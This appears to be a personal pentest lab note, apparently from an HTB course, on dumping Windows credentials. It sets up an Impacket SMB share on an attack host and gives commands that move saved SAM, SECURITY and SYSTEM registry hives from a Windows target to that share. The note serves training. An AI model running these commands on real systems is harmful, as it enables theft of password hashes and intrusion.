
```shell-session
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/Desktop
```

```shell-session
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Optional : Check if share is running

```
smbclient //127.0.0.1/CompData -N
```

Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.

#### Moving hive copies to share

  Attacking SAM, SYSTEM, and SECURITY

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `move sam.save \\\\${KaliIP}\\\CompData`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `move security.save \\\\${KaliIP}\\\CompData`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `move system.save \\\\${KaliIP}\\\CompData`;

dv.paragraph("```bash\n" + command + "\n```");
```
We can then confirm that our hive copies were successfully moved to the share by navigating to the shared directory on our attack host and using `ls` to list the files.

  Attacking SAM, SYSTEM, and SECURITY

```shell-session
Retric@htb[/htb]$ ls

sam.save  security.save  system.save
```
